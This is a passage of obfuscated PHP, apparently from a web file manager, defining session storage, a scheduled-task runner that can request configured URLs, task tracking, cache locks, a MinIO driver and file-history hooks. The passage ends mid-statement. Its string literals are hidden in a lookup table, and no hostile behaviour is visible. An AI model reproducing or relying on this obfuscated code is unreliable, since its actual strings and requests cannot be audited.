<?php
 goto D„¨‚¬ÓïÓ; b¹ÎßÚ±§ğ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Œàò«˜ı =& $_SERVER[¹àö™Ç¾]; static $áàíØñ· = false; if ($áàíØñ·) { return $áàíØñ·; } $³ƒí†Ñü = $GLOBALS[$Œàò«˜ı[16]][$Œàò«˜ı[353]]; self::$sessionTime = $³ƒí†Ñü[$Œàò«˜ı[1596]]; $°Ö»áü˜ = isset($GLOBALS[$Œàò«˜ı[1597]]) ? $GLOBALS[$Œàò«˜ı[1597]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($°Ö»áü˜)) { self::$sessionSign = Cookie::get($°Ö»áü˜); } else { self::$sessionSign = guid(); } } Cookie::setSafe($°Ö»áü˜, self::$sessionSign, self::$sessionTime); $‡Õˆ§£ù = $³ƒí†Ñü[$Œàò«˜ı[1598]]; $Ğ¯èÑŞ™ = $³ƒí†Ñü[$‡Õˆ§£ù]; $’ùŞÀÑœ = $³ƒí†Ñü[$Œàò«˜ı[820]]; switch ($‡Õˆ§£ù) { case $Œàò«˜ı[31]: self::$handle = Model($Œàò«˜ı[821]); break; case $Œàò«˜ı[822]: self::$handle = new CacheRedis($Ğ¯èÑŞ™, $’ùŞÀÑœ); break; case $Œàò«˜ı[823]: self::$handle = new CacheMemcached($Ğ¯èÑŞ™, $’ùŞÀÑœ); break; case $Œàò«˜ı[202]: $Ğ¯èÑŞ™[$Œàò«˜ı[88]] = $Ğ¯èÑŞ™[$Œàò«˜ı[88]] . $Œàò«˜ı[1599]; self::$handle = new CacheFile($Ğ¯èÑŞ™, $’ùŞÀÑœ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $áàíØñ· = new self(); return $áàíØñ·; } public static function getBySign($®éÅ™ê©) { CacheLock::lock($®éÅ™ê©); $©¸Í²¯› = self::$handle->get($®éÅ™ê©); CacheLock::unlock($®éÅ™ê©); $©¸Í²¯› = unserialize($©¸Í²¯›); return is_array($©¸Í²¯›) ? $©¸Í²¯› : array(); } public static function setBySign($ÚÈÜ¶ŸŒ, $¡Ó²µ¢Ì) { CacheLock::lock($ÚÈÜ¶ŸŒ); self::$handle->set($ÚÈÜ¶ŸŒ, serialize($¡Ó²µ¢Ì), self::$sessionTime); CacheLock::unlock($ÚÈÜ¶ŸŒ); } public static function sign($æäöëìé = false) { $æäöëìé && (self::$sessionSign = $æäöëìé); self::init(); return self::$sessionSign; } public static function set($ÜíØÒ, $Ê¸ÏÎÃ… = false) { self::init(); if (is_array($ÜíØÒ)) { foreach ($ÜíØÒ as $Ã•‚¬²ƒ => $«ÕÃ‹À²) { array_set_value(self::$data, $Ã•‚¬²ƒ, $«ÕÃ‹À²); } } else { array_set_value(self::$data, $ÜíØÒ, $Ê¸ÏÎÃ…); } self::setBySign(self::$sessionSign, self::$data); } public static function get($æÁÊ‘šÂ = false) { self::init(); if (!$æÁÊ‘šÂ) { return self::$data; } return array_get_value(self::$data, $æÁÊ‘šÂ); } public static function remove($ú¥¯ƒÄ‚) { self::init(); unset(self::$data[$ú¥¯ƒÄ‚]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¹àö™Ç¾][825])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¾£ÊÂ =& $_SERVER[¹àö™Ç¾]; if (self::valueGet($¾£ÊÂ[742]) != $¾£ÊÂ[99]) { return; } if (self::valueGet($¾£ÊÂ[1600]) == $¾£ÊÂ[99]) { $»ğ¿ß§• = self::valueGet($¾£ÊÂ[1601]); if (time() - $»ğ¿ß§• > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($¾£ÊÂ[1600], $¾£ÊÂ[99]); self::log($¾£ÊÂ[1602]); Hook::bind($¾£ÊÂ[1603], $¾£ÊÂ[1604]); $®Éß¿şÓ = 0; while (!0) { self::cacheClear(); if (self::valueGet($¾£ÊÂ[742]) != $¾£ÊÂ[99]) { self::valueSet($¾£ÊÂ[1600], $¾£ÊÂ[200]); self::log($¾£ÊÂ[1605]); die; } $ˆï“äç² = time(); if ($ˆï“äç² - $®Éß¿şÓ >= 60) { self::valueSet(array($¾£ÊÂ[1600] => $¾£ÊÂ[99], $¾£ÊÂ[1601] => $ˆï“äç²), !1); $®Éß¿şÓ = $ˆï“äç²; } if (!file_exists(USER_SYSTEM . $¾£ÊÂ[1606])) { self::valueSet(array($¾£ÊÂ[1600] => $¾£ÊÂ[200], $¾£ÊÂ[742] => $¾£ÊÂ[200]), !1); self::log($¾£ÊÂ[1607]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $¤¿Ú´¥• =& $_SERVER[¹àö™Ç¾]; http_close(); self::valueSet($¤¿Ú´¥•[742], $¤¿Ú´¥•[200]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¤¿Ú´¥•[1600] => $¤¿Ú´¥•[200], $¤¿Ú´¥•[742] => $¤¿Ú´¥•[99]), !1); } public static function shutdownEvent() { $¿‘»Âáí =& $_SERVER[¹àö™Ç¾]; self::valueSet($¿‘»Âáí[1600], $¿‘»Âáí[200]); self::log($¿‘»Âáí[1608]); } public static function config($¼Ğæöãß, $ğ¿ßÒÂÑ) { self::valueSet($_SERVER[¹àö™Ç¾][742], $¼Ğæöãß); } private static function taskRunAll() { $ùĞ–âÙ =& $_SERVER[¹àö™Ç¾]; $³¤³ØÔ» = timeFloat(); $”ë•—¶ë = Model($ùĞ–âÙ[1609])->listData(); $¶äĞÕñ¾ = count($”ë•—¶ë); for ($ÓÍ±÷ä = 0; $ÓÍ±÷ä < $¶äĞÕñ¾; $ÓÍ±÷ä++) { $Ë—×‡° = $”ë•—¶ë[$ÓÍ±÷ä]; if (!$Ë—×‡°[$ùĞ–âÙ[401]] || $Ë—×‡°[$ùĞ–âÙ[1610]] != $ùĞ–âÙ[99]) { continue; } if (!self::taskTimeCheck($Ë—×‡°)) { continue; } self::taskRun($Ë—×‡°); } Hook::trigger($ùĞ–âÙ[1611]); self::taskQueueRun($³¤³ØÔ»); } private static function taskQueueRun($´Ìô°öü) { $™âïÇçğ = 10; while (!0) { $šì‘üÈİ = TaskQueue::run(); if ($šì‘üÈİ === !1) { break; } if (timeFloat() - $´Ìô°öü >= $™âïÇçğ) { break; } } } private static function taskTimeCheck($îñš´Û—) { $²Å‚øÁ =& $_SERVER[¹àö™Ç¾]; $ªÖÀ€É = json_decode($îñš´Û—[$²Å‚øÁ[206]], !0); $ÆŸâ’Ğ§ = intval($îñš´Û—[$²Å‚øÁ[1601]]); $Ëó‘ûä· = strtotime($²Å‚øÁ[1612] . $ªÖÀ€É[$²Å‚øÁ[1613]] . $²Å‚øÁ[1614]) - strtotime($²Å‚øÁ[1615]); $‘ñã‡Š = time() - strtotime(date($²Å‚øÁ[1616]) . $²Å‚øÁ[1617]); $û®”îæ’ = $‘ñã‡Š >= $Ëó‘ûä· && $‘ñã‡Š <= $Ëó‘ûä· + 3600; switch ($ªÖÀ€É[$²Å‚øÁ[43]]) { case $²Å‚øÁ[1618]: if (time() - $ÆŸâ’Ğ§ < 3600 * 24 * 30) { return !1; } if ($ªÖÀ€É[$²Å‚øÁ[1618]] == date($²Å‚øÁ[1619]) && $û®”îæ’) { return !0; } break; case $²Å‚øÁ[1620]: if (time() - $ÆŸâ’Ğ§ < 3600 * 24 * 7) { return !1; } $ÚÄÌ—† = date($²Å‚øÁ[1621]) == 0 ? 7 : date($²Å‚øÁ[1621]); if ($ªÖÀ€É[$²Å‚øÁ[1620]] == $ÚÄÌ—† && $û®”îæ’) { return !0; } break; case $²Å‚øÁ[1613]: if (time() - $ÆŸâ’Ğ§ < 3600 * 24) { return !1; } if ($û®”îæ’) { return !0; } break; case $²Å‚øÁ[1622]: if (time() - $ÆŸâ’Ğ§ >= floatval($ªÖÀ€É[$²Å‚øÁ[1622]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¡ÂŸëĞ· =& $_SERVER[¹àö™Ç¾]; static $‹³„•óÆ = 0; $ç€æ¼¡ß = 300; if (!$‹³„•óÆ) { $‹³„•óÆ = time(); } if (time() - $‹³„•óÆ < $ç€æ¼¡ß) { return; } $‹³„•óÆ = time(); $Š¾¡€­ß = Model($¡ÂŸëĞ·[513])->db($¡ÂŸëĞ·[22]); if ($Š¾¡€­ß) { $Š¾¡€­ß->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¡ÂŸëĞ·[1623], $¡ÂŸëĞ·[1624]); die; } } public static function taskRun($¦¼ÕÙ›ª) { $ºğùšÚË =& $_SERVER[¹àö™Ç¾]; self::log($ºğùšÚË[1625] . $¦¼ÕÙ›ª[$ºğùšÚË[401]] . $ºğùšÚË[1626] . $¦¼ÕÙ›ª[$ºğùšÚË[42]] . $ºğùšÚË[1627] . $¦¼ÕÙ›ª[$ºğùšÚË[1628]]); Model($ºğùšÚË[1609])->run($¦¼ÕÙ›ª[$ºğùšÚË[401]]); $Ÿ‰Ÿ¿‹— = timeFloat(); $ÙÕĞÒ¥ = $ºğùšÚË[22]; switch ($¦¼ÕÙ›ª[$ºğùšÚË[43]]) { case $ºğùšÚË[311]: $ß­íş£À = url_request($¦¼ÕÙ›ª[$ºğùšÚË[1628]], $ºğùšÚË[235], !1, !1, !1, !1, 10); if ($ß­íş£À[$ºğùšÚË[742]]) { $ÙÕĞÒ¥ = strlen($ß­íş£À[$ºğùšÚË[1176]]); } break; case $ºğùšÚË[234]: $ÙÕĞÒ¥ = Hook::apply($¦¼ÕÙ›ª[$ºğùšÚË[1628]]); default: break; } Model($ºğùšÚË[1629])->add(array($ºğùšÚË[1630] => $ºğùšÚË[22], $ºğùšÚË[1631] => $ºğùšÚË[200], $ºğùšÚË[43] => $ºğùšÚË[1632] . $¦¼ÕÙ›ª[$ºğùšÚË[401]], $ºğùšÚË[1633] => json_encode(array($ºğùšÚË[42] => $¦¼ÕÙ›ª[$ºğùšÚË[42]], $ºğùšÚË[1634] => timeFloat() - $Ÿ‰Ÿ¿‹—, $ºğùšÚË[297] => $ÙÕĞÒ¥)))); $³·‘âä = $ÙÕĞÒ¥ ? $ºğùšÚË[1635] . $ÙÕĞÒ¥ : $ºğùšÚË[22]; self::log($ºğùšÚË[1636] . $¦¼ÕÙ›ª[$ºğùšÚË[401]] . $ºğùšÚË[536] . $³·‘âä); return !0; } private static function valueGet($ßÙ’„°) { $ÌÆ•úØ¼ =& $_SERVER[¹àö™Ç¾]; $Å¦Ö›ê‚ = $ÌÆ•úØ¼[1637]; $ƒ‘Ÿ¦–ğ = Model($ÌÆ•úØ¼[433])->get($ßÙ’„°, $Å¦Ö›ê‚); if (is_null($ƒ‘Ÿ¦–ğ)) { Model($ÌÆ•úØ¼[433])->set($ÌÆ•úØ¼[742], $ÌÆ•úØ¼[99], $Å¦Ö›ê‚); Model($ÌÆ•úØ¼[433])->set($ÌÆ•úØ¼[1600], $ÌÆ•úØ¼[200], $Å¦Ö›ê‚); $ƒ‘Ÿ¦–ğ = Model($ÌÆ•úØ¼[433])->get($ßÙ’„°, $Å¦Ö›ê‚); } return $ƒ‘Ÿ¦–ğ; } private static function valueSet($Ã¹ëç­¸, $œËËç¸Ö) { $ÆÄü’„½ =& $_SERVER[¹àö™Ç¾]; $ûµ«Âé¹ = $ÆÄü’„½[1638]; CacheLock::lock($ûµ«Âé¹); $ë»´¶¾ = Model($ÆÄü’„½[433])->set($Ã¹ëç­¸, $œËËç¸Ö, $ÆÄü’„½[1637]); CacheLock::unlock($ûµ«Âé¹); return $ë»´¶¾; } protected static function log($šÚÑòÍ ) { write_log($šÚÑòÍ , $_SERVER[¹àö™Ç¾][1624]); } private static function cacheClear() { $ˆôİœÄã =& $_SERVER[¹àö™Ç¾]; Cache::clearMemory(Model($ˆôİœÄã[433])->cacheKey($ˆôİœÄã[1637])); Cache::clearMemory(Model($ˆôİœÄã[433])->cacheKey($ˆôİœÄã[1639])); Model($ˆôİœÄã[1609])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\x72\165\156\x6e\x69\x6e\147"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($äĞ‘äÓª, $¾¿ŠÜ› = '', $à¸èÅĞ„ = 0, $¸ÀÔ”ñ½ = '') { $›¿å°´¹ =& $_SERVER[¹àö™Ç¾]; if (self::get($äĞ‘äÓª)) { return; } $this->task = array($›¿å°´¹[401] => $äĞ‘äÓª, $›¿å°´¹[1640] => USER_ID, $›¿å°´¹[1540] => $¸ÀÔ”ñ½, $›¿å°´¹[43] => $¾¿ŠÜ›, $›¿å°´¹[1049] => $›¿å°´¹[22], $›¿å°´¹[778] => $à¸èÅĞ„, $›¿å°´¹[1641] => 0, $›¿å°´¹[1642] => 0, $›¿å°´¹[1643] => 0, $›¿å°´¹[1644] => timeFloat(), $›¿å°´¹[1645] => 0, $›¿å°´¹[1646] => 0, $›¿å°´¹[1647] => 0, $›¿å°´¹[1648] => 0, $›¿å°´¹[742] => $›¿å°´¹[1600]); $GLOBALS[$›¿å°´¹[1649]] = 1; Hook::bind($›¿å°´¹[1603], array($this, $›¿å°´¹[1650])); Hook::bind($›¿å°´¹[1651], array($this, $›¿å°´¹[1652])); $this->startAfter(); Hook::trigger($›¿å°´¹[1653], $this->task); $this->task[$›¿å°´¹[1646]] = timeFloat(); } public function end() { $èÁ’‹Ê =& $_SERVER[¹àö™Ç¾]; if (!$this->task) { return; } if ($this->task[$èÁ’‹Ê[1646]]) { self::valueSet($this->task[$èÁ’‹Ê[401]], !1); } $ëºƒû’¸ = timeFloat() - $this->task[$èÁ’‹Ê[1644]]; self::log($èÁ’‹Ê[1654] . $this->task[$èÁ’‹Ê[401]] . $èÁ’‹Ê[1655] . $ëºƒû’¸ . $èÁ’‹Ê[1656]); Hook::unbind($èÁ’‹Ê[1603], array($this, $èÁ’‹Ê[1650])); Hook::unbind($èÁ’‹Ê[1651], array($this, $èÁ’‹Ê[1652])); $this->endAfter(); $this->task = !1; } public function update($™ìáñ…± = 0, $É¿®«ë = false) { $›·„ÍÄŞ =& $_SERVER[¹àö™Ç¾]; $çâ‹É =& $this->task; if (!$çâ‹É) { return; } $çâ‹É[$›·„ÍÄŞ[1641]] += $™ìáñ…±; $çâ‹É[$›·„ÍÄŞ[1645]] = timeFloat(); if ($çâ‹É[$›·„ÍÄŞ[778]]) { if ($çâ‹É[$›·„ÍÄŞ[778]] < $çâ‹É[$›·„ÍÄŞ[1641]]) { $çâ‹É[$›·„ÍÄŞ[778]] = $çâ‹É[$›·„ÍÄŞ[1641]]; } $Ç®ÄÕ«ã = timeFloat() - $çâ‹É[$›·„ÍÄŞ[1644]] - $çâ‹É[$›·„ÍÄŞ[1647]]; $çâ‹É[$›·„ÍÄŞ[1642]] = $çâ‹É[$›·„ÍÄŞ[1641]] / $çâ‹É[$›·„ÍÄŞ[778]]; $çâ‹É[$›·„ÍÄŞ[1643]] = $çâ‹É[$›·„ÍÄŞ[1641]] / $Ç®ÄÕ«ã; if ($çâ‹É[$›·„ÍÄŞ[1642]] > 0) { $çâ‹É[$›·„ÍÄŞ[1648]] = $Ç®ÄÕ«ã * (1 - $çâ‹É[$›·„ÍÄŞ[1642]]) / $çâ‹É[$›·„ÍÄŞ[1642]]; } $çâ‹É[$›·„ÍÄŞ[1648]] = $çâ‹É[$›·„ÍÄŞ[1648]] <= 0 ? 0 : $çâ‹É[$›·„ÍÄŞ[1648]]; } $this->updateAfter(); $ÔÏ¨¯õĞ = 0.2; if (timeFloat() - $çâ‹É[$›·„ÍÄŞ[1646]] < $ÔÏ¨¯õĞ && !$É¿®«ë) { return; } $Äùªà¡ = self::get($çâ‹É[$›·„ÍÄŞ[401]]); $ıçĞÅØâ = $Äùªà¡[$›·„ÍÄŞ[742]]; if ($ıçĞÅØâ == self::STATYS_KILL) { $ïÕÔü¢Î = array($›·„ÍÄŞ[1657] => LNG($›·„ÍÄŞ[1658]), $›·„ÍÄŞ[1174] => !1); Cache::set($›·„ÍÄŞ[1659] . $this->task[$›·„ÍÄŞ[401]], $ïÕÔü¢Î, 30); $this->onKill(); $this->end(); die; } else { if ($ıçĞÅØâ == self::STATYS_STOP) { $Ëµ©„ˆç = 2; $Äùªà¡[$›·„ÍÄŞ[1647]] += $Ëµ©„ˆç; self::valueSet($çâ‹É[$›·„ÍÄŞ[401]], $Äùªà¡); sleep($Ëµ©„ˆç); $this->update(); return; } } $çâ‹É[$›·„ÍÄŞ[742]] = $ıçĞÅØâ ? $ıçĞÅØâ : $çâ‹É[$›·„ÍÄŞ[742]]; $çâ‹É[$›·„ÍÄŞ[1647]] = $Äùªà¡[$›·„ÍÄŞ[1647]] ? $Äùªà¡[$›·„ÍÄŞ[1647]] : 0; $çâ‹É[$›·„ÍÄŞ[1646]] = timeFloat(); Hook::trigger($›·„ÍÄŞ[1660], $çâ‹É); self::valueSet($çâ‹É[$›·„ÍÄŞ[401]], $çâ‹É); } public function onKillSet($à¨£Ì, $íñš‰Ãø = array()) { $this->onKillCall = array($à¨£Ì, $íñš‰Ãø); } public function onKill() { $Ÿ·¯ñïœ =& $_SERVER[¹àö™Ç¾]; self::log($Ÿ·¯ñïœ[1654] . $this->task[$Ÿ·¯ñïœ[401]] . $Ÿ·¯ñïœ[1661]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¨äÖ†ß•) { $ ñÓÇ› =& $_SERVER[¹àö™Ç¾]; Cache::set($ ñÓÇ›[1659] . $this->task[$ ñÓÇ›[401]], $¨äÖ†ß•, 60); return $¨äÖ†ß•; } public static function get($Ã´ÆéÙÊ) { $ıÑò‡ôœ =& $_SERVER[¹àö™Ç¾]; $¨Üï¼Ÿœ = self::valueGet($Ã´ÆéÙÊ); if (is_array($¨Üï¼Ÿœ) && $¨Üï¼Ÿœ[$ıÑò‡ôœ[1662]]) { $Íé£ÆŒÜ = ActionApply($¨Üï¼Ÿœ[$ıÑò‡ôœ[1662]], array($¨Üï¼Ÿœ)); $¨Üï¼Ÿœ = is_array($Íé£ÆŒÜ) ? $Íé£ÆŒÜ : $¨Üï¼Ÿœ; } return $¨Üï¼Ÿœ; } public static function listData() { $İÖò–»ï = self::valueGet(); return array_sort_by($İÖò–»ï, $_SERVER[¹àö™Ç¾][1644], !0); } public static function kill($®¾Ãí˜š) { return self::changeStatus($®¾Ãí˜š, self::STATYS_KILL); } public static function stop($Åòø¸Ñº) { return self::changeStatus($Åòø¸Ñº, self::STATYS_STOP); } public static function restart($ĞÎéãÊò) { return self::changeStatus($ĞÎéãÊò, self::STATYS_RUNNING); } public static function killAll() { $ÒÏ©Šù€ =& $_SERVER[¹àö™Ç¾]; $„›¿§ØÕ = self::listData(); foreach ($„›¿§ØÕ as $ó¹ÓÛ¦ç) { self::kill($ó¹ÓÛ¦ç[$ÒÏ©Šù€[401]]); } sleep(2); foreach ($„›¿§ØÕ as $ó¹ÓÛ¦ç) { self::valueSet($ó¹ÓÛ¦ç[$ÒÏ©Šù€[401]], !1); } } private static function changeStatus($™èÊ£Ò¹, $¢à´ŞÓš) { $Œõ‡»Ğ =& $_SERVER[¹àö™Ç¾]; $îüÉÒ = self::valueGet($™èÊ£Ò¹); if (!$îüÉÒ) { return !1; } $îüÉÒ[$Œõ‡»Ğ[742]] = $¢à´ŞÓš; self::valueSet($™èÊ£Ò¹, $îüÉÒ); self::log($Œõ‡»Ğ[1663] . $îüÉÒ[$Œõ‡»Ğ[401]] . $Œõ‡»Ğ[1664] . $¢à´ŞÓš); return !0; } public static function valueGet($‚äÛ“ù´ = false) { $œçÄÒÊ€ =& $_SERVER[¹àö™Ç¾]; if ($‚äÛ“ù´) { $¿şìŞÊ˜ = Model($œçÄÒÊ€[445])->where(array($œçÄÒÊ€[105] => $‚äÛ“ù´, $œçÄÒÊ€[43] => $œçÄÒÊ€[1056]))->find(); return $¿şìŞÊ˜ ? json_decode($¿şìŞÊ˜[$œçÄÒÊ€[378]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($…ìÂÆ– = false) { $Ê›³ÄË =& $_SERVER[¹àö™Ç¾]; $©Œ«‹¢ = array($Ê›³ÄË[43] => $Ê›³ÄË[1056]); if ($…ìÂÆ–) { $©Œ«‹¢[$Ê›³ÄË[1640]] = $…ìÂÆ–; } $±ˆÛ‡•· = Model($Ê›³ÄË[445])->where($©Œ«‹¢)->select(); $±ˆÛ‡•· = $±ˆÛ‡•· ? $±ˆÛ‡•· : array(); foreach ($±ˆÛ‡•· as $£æÑÀô‘ => $Š¥‚Ÿ… ) { $±ˆÛ‡•·[$£æÑÀô‘] = json_decode($Š¥‚Ÿ… [$Ê›³ÄË[378]], !0); } return $±ˆÛ‡•·; } public static function valueSet($ÏÇı·êŞ, $ûÉƒ£Œ) { $’¢‰ÃÉ‘ =& $_SERVER[¹àö™Ç¾]; if (!$ûÉƒ£Œ) { return Model($’¢‰ÃÉ‘[445])->where(array($’¢‰ÃÉ‘[105] => $ÏÇı·êŞ, $’¢‰ÃÉ‘[43] => $’¢‰ÃÉ‘[1056]))->delete(); } $ôØàÀ£» = json_encode($ûÉƒ£Œ); if (!$ôØàÀ£») { ob_start(); var_dump($ûÉƒ£Œ); $Ø®Àıİè = ob_get_clean(); self::log($’¢‰ÃÉ‘[1665] . json_encode_force($Ø®Àıİè)); } if (!$ÏÇı·êŞ || !$ûÉƒ£Œ[$’¢‰ÃÉ‘[401]]) { return !1; } $â»ï¨¬­ = array($’¢‰ÃÉ‘[43] => $’¢‰ÃÉ‘[1056], $’¢‰ÃÉ‘[1640] => USER_ID, $’¢‰ÃÉ‘[105] => $ÏÇı·êŞ, $’¢‰ÃÉ‘[378] => $ôØàÀ£»); $Ù¬µ… = $’¢‰ÃÉ‘[1666]; CacheLock::lock($Ù¬µ…); Model($’¢‰ÃÉ‘[445])->add($â»ï¨¬­, array(), !0); CacheLock::unlock($Ù¬µ…); } public static function log($é››—†—) { if (!GLOBAL_DEBUG) { return; } write_log($é››—†—, $_SERVER[¹àö™Ç¾][1667]); } } goto eÔ©³•¬ŒÁ; FŒáÏåÀÒ²: class CacheLockMemcached { public function lock($³âõ¹›, $¶İÆªå‰ = 0) { $ê‚ÛˆÕØ = Cache::init(); $çûö…™ = microtime(!0) + $¶İÆªå‰; while (microtime(!0) < $çûö…™) { $˜ÏÕİğ = $ê‚ÛˆÕØ->get($³âõ¹›); if (!$˜ÏÕİğ || $˜ÏÕİğ < microtime(!0)) { $±ŠÌéÙ = $ê‚ÛˆÕØ->handle->add($³âõ¹›, $çûö…™, $¶İÆªå‰); if ($±ŠÌéÙ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ş•³ßÇ) { return Cache::init()->get($ş•³ßÇ); } public function unlock($Ôô«ëŸÕ) { return Cache::init()->remove($Ôô«ëŸÕ); } } class CacheLockDatabase { public function lock($À£ŸßÃ…, $‡’—ìŸ³ = 0) { $ƒö©­Œš = Model($_SERVER[¹àö™Ç¾][821]); $ éˆŸÜ  = microtime(!0) + $‡’—ìŸ³; while (microtime(!0) < $ éˆŸÜ ) { $ß‘³²¸€ = $ƒö©­Œš->get($À£ŸßÃ…); if (!$ß‘³²¸€ || $ß‘³²¸€ < microtime(!0)) { $³ŠÃÓ Ä = $ƒö©­Œš->set($À£ŸßÃ…, $ éˆŸÜ ); if ($³ŠÃÓ Ä) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($«ÂœØ¼Ø) { return Model($_SERVER[¹àö™Ç¾][821])->get($«ÂœØ¼Ø); } public function unlock($ë¥êÄ†¢) { Model($_SERVER[¹àö™Ç¾][821])->remove($ë¥êÄ†¢); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ï‚ë™ë­, $èÛ–ÇÑÜ) { $èºÊè’Ã =& $_SERVER[¹àö™Ç¾]; if (!class_exists($èºÊè’Ã[854])) { show_json($èºÊè’Ã[855], !1); } $this->cacheTime = $èÛ–ÇÑÜ; $this->handle = new Memcached(); if (is_array($Ï‚ë™ë­[$èºÊè’Ã[856]]) && count($Ï‚ë™ë­[$èºÊè’Ã[856]]) >= 1) { foreach ($Ï‚ë™ë­[$èºÊè’Ã[856]] as $šÌÓÕÄ¿) { $İ‡œ·£ = explode($èºÊè’Ã[4], $šÌÓÕÄ¿); $this->handle->addServer($İ‡œ·£[0], $İ‡œ·£[1]); } } else { $this->handle->addServer($Ï‚ë™ë­[$èºÊè’Ã[184]], $Ï‚ë™ë­[$èºÊè’Ã[185]]); } } public function set($ï¯åñÚ, $¬ÕÖªä, $ÈÛõ¢ÛÃ = false) { $ÈÛõ¢ÛÃ = $ÈÛõ¢ÛÃ ? $ÈÛõ¢ÛÃ : $this->cacheTime; return $this->handle->set($ï¯åñÚ, $¬ÕÖªä, $ÈÛõ¢ÛÃ); } public function get($ù´ğËøº) { return $this->handle->get($ù´ğËøº); } public function remove($åáŠ¦…ñ) { return $this->handle->delete($åáŠ¦…ñ); } public function deleteAll() { return $this->handle->flush(); } } goto B’›Æ¼Åù†; bÓ¬§‘•¼: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ĞÒ£æ€¹) { parent::__construct($ĞÒ£æ€¹); $this->signatureVersion($_SERVER[¹àö™Ç¾][221]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } define($_SERVER[¹àö™Ç¾][242], 1); define($_SERVER[¹àö™Ç¾][243], 2); goto DÃºÒäî‚Ë; BŞ«ïÄÜ¥Ë: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $™ö±Â·¦ =& $_SERVER[¹àö™Ç¾]; $ƒÛñÍİ = $GLOBALS[$™ö±Â·¦[16]][$™ö±Â·¦[100]]; if ($ƒÛñÍİ[$™ö±Â·¦[1191]] != 1) { return; } if ($ƒÛñÍİ[$™ö±Â·¦[1192]] <= 0) { return; } if (isset($_REQUEST[$™ö±Â·¦[1193]]) && $_REQUEST[$™ö±Â·¦[1193]] == $™ö±Â·¦[99]) { return; } Hook::bind($™ö±Â·¦[1194], $™ö±Â·¦[1195]); Hook::bind($™ö±Â·¦[1196], $™ö±Â·¦[1197]); Hook::bind($™ö±Â·¦[1198], $™ö±Â·¦[1199]); Hook::bind($™ö±Â·¦[1200], $™ö±Â·¦[1201]); Hook::bind($™ö±Â·¦[1202], $™ö±Â·¦[1203]); Hook::bind($™ö±Â·¦[1204], $™ö±Â·¦[1205]); } public static function eventBeforeUpload($õàÀÒÔó) { if ($õàÀÒÔó[3] && $õàÀÒÔó[3] != REPEAT_REPLACE) { return; } $‚íşµ÷ = self::parsePath($õàÀÒÔó[0]); if (!$‚íşµ÷) { return; } self::add($‚íşµ÷); } public static function eventBeforeEdit($¼òÔíÀ´) { $´—˜ŒËö = self::parsePath($¼òÔíÀ´[0]); if (!$´—˜ŒËö) { return; } self::add($´—˜ŒËö); } public static function eventBeforeCopyFile($ùø¹£˜, $Ö ›íÍ², $–µïÄš, $†İ£Õ, $Â¿üğÇÈ, $›ÚÉôá) { $ü¹½­·Ÿ = $–µïÄš->getPathOuter($†İ£Õ); $î¾å‹ãú = self::parsePath($ü¹½­·Ÿ); if (!$î¾å‹ãú) { return; } self::add($î¾å‹ãú); } public static function eventBeforeRename($æÜ“¿ê§) { $Á»Ñâù¨ =& $_SERVER[¹àö™Ç¾]; $æŒãëç‚ = self::parsePath($æÜ“¿ê§[0]); if (!$æŒãëç‚) { return; } $ïáñØÏû = self::checkInHistory($æŒãëç‚); if (!$ïáñØÏû) { return; } if ($ïáñØÏû[$Á»Ñâù¨[43]] == $Á»Ñâù¨[202]) { $Ñª´§„“ = self::listData($æŒãëç‚); if ($Ñª´§„“ && $Ñª´§„“[$Á»Ñâù¨[373]]) { self::moveHistory($æŒãëç‚, $æÜ“¿ê§[1]); } } else { IO::rename($ïáñØÏû[$Á»Ñâù¨[88]], $æÜ“¿ê§[1]); } } public static function eventBeforeMove($İ‹Ÿš×) { $ä®ìÙ =& $_SERVER[¹àö™Ç¾]; $·ë¸‘±Î = self::parsePath($İ‹Ÿš×[0]); if (!$·ë¸‘±Î) { return; } $Å§ÅÖ×İ = self::parsePath($İ‹Ÿš×[1]); if (!$Å§ÅÖ×İ) { return; } $æ‡½¬ö½ = $İ‹Ÿš×[3]; $‰³×Ü¯æ = self::checkInHistory($·ë¸‘±Î); if (!$‰³×Ü¯æ) { return; } $Çé£üîÉ = self::pathHistory($Å§ÅÖ×İ); if ($‰³×Ü¯æ[$ä®ìÙ[43]] == $ä®ìÙ[202]) { $½ÊÏÀ©Ö = self::listData($·ë¸‘±Î); $ÕÙÛª¡à = rtrim($Å§ÅÖ×İ, $ä®ìÙ[18]) . $ä®ìÙ[18] . ($æ‡½¬ö½ ? $æ‡½¬ö½ : get_path_this($·ë¸‘±Î)); $½Â±„–ä = self::listData($ÕÙÛª¡à); if ($½ÊÏÀ©Ö && $½ÊÏÀ©Ö[$ä®ìÙ[373]] && $½Â±„–ä && $½Â±„–ä[$ä®ìÙ[373]]) { return self::clear($·ë¸‘±Î); } if ($½ÊÏÀ©Ö && $½ÊÏÀ©Ö[$ä®ìÙ[373]]) { self::moveHistory($·ë¸‘±Î, 